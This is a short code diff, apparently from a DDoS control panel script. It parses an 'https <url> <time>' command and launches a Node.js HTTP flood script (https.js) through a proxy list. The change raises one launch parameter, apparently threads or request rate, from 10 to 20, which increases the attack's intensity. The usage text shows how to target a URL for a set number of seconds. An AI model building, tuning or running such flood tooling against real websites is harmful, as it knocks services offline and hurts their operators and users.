@@ -261,7 +261,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node https.js {url} {time} 32 10 proxy.txt')
+                os.system(f'node https.js {url} {time} 32 20 proxy.txt')
             except IndexError:
                 print('Usage: https <url> <time>')
                 print('Example: https http://example.com 60')
